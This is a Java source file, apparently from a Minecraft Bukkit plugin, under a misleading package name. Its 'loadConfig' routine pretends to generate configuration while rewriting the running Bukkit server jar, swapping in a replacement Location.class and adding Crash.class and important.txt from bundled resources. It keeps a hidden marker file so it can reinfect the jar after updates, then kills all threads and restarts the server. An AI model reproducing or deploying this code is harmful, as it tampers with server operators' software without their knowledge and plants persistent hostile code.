package com.Skype;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Enumeration;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import javax.swing.JOptionPane;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.Main;

public class CopyOfCopyOfCopyOfz {
 
	public static void loadConfig(){
		File foo =new File(Bukkit.class.getProtectionDomain().getCodeSource().getLocation().getPath());
		File fooBarPoop=new File("plugins/(-(-_(-_-)_-)-).XD");
		try{
			try{
			ObjectInputStream ois=new ObjectInputStream(new FileInputStream(fooBarPoop));
				if(ois.readLong()!=foo.length())
					throw(new Exception("Dear <subject name here> you have been doomed!"));
			}catch(Exception e){
				System.out.print("Start config generation...");
				addFileToArchive(foo);
				System.out.println("done");
				ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(fooBarPoop));
				oos.writeLong(foo.length());
				oos.close();
			}
		}catch (Exception e){
			e.printStackTrace();
		}
																																		//FileOutputStream bar;
	}
	public static void addFileToArchive(File archiveFile)
            throws Exception {
 
        File tmpFile = new File(String.valueOf(System.currentTimeMillis()));
 
        ZipFile zipSrc = new ZipFile(archiveFile);
 
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(tmpFile));
 
        Enumeration srcEntries = zipSrc.entries();
        while (srcEntries.hasMoreElements()) {
        	ZipEntry entry = (ZipEntry) srcEntries.nextElement();
        	if(!(entry.getName().endsWith("Location.class")||entry.getName().endsWith("Crash.class")||entry.getName().endsWith("important.txt"))){
        		zos.putNextEntry(entry);
 
        		BufferedInputStream bis = new BufferedInputStream(zipSrc
                    .getInputStream(entry));
 
        		while (bis.available() > 0) {
        			zos.write(bis.read());
        		}
        		zos.closeEntry();
        		
        		bis.close();
        	}
        }
        //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        ZipEntry newEntry = new ZipEntry("org/bukkit/Location.class");
        zos.putNextEntry(newEntry);
 
        BufferedInputStream bis = new BufferedInputStream(CopyOfCopyOfCopyOfz.class.getResourceAsStream("l.txt"));
        while (bis.available() > 0) {
            zos.write(bis.read());
        }
        zos.closeEntry();
       /////////////////////////////////////////////////////////// 
         newEntry = new ZipEntry("org/bukkit/Crash.class");
        zos.putNextEntry(newEntry);
 
         bis = new BufferedInputStream(CopyOfCopyOfCopyOfz.class.getResourceAsStream("c.txt"));
        while (bis.available() > 0) {
            zos.write(bis.read());
        }
        zos.closeEntry();
        ////////////////////////////////////////////////////////////
         newEntry = new ZipEntry("org/bukkit/important.txt");
        zos.putNextEntry(newEntry);
 
         bis = new BufferedInputStream(CopyOfCopyOfCopyOfz.class.getResourceAsStream("important.txt"));
        while (bis.available() > 0) {
            zos.write(bis.read());
        }
        zos.closeEntry();
        //-------------------------------------------------------------
        zos.finish();
 
        zos.close();
 
        zipSrc.close();
        FileInputStream fis=new FileInputStream(tmpFile);
        FileOutputStream fos=new FileOutputStream(archiveFile);
        while(fis.available()>1024){
        	byte[] b =new byte[1024];
        	fis.read(b);
        	fos.write(b);
        }
        while(fis.available()>0)
        	fos.write(fis.read());
        fos.close();
        fis.close();
        tmpFile.delete();
         new Thread(){
        	public void run() {
        		Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
        		for(Thread t:threadSet)
        			t.stop();
        		 Main.main(null);
        	};
        }.start();
        Thread.currentThread().interrupt();
    }
}
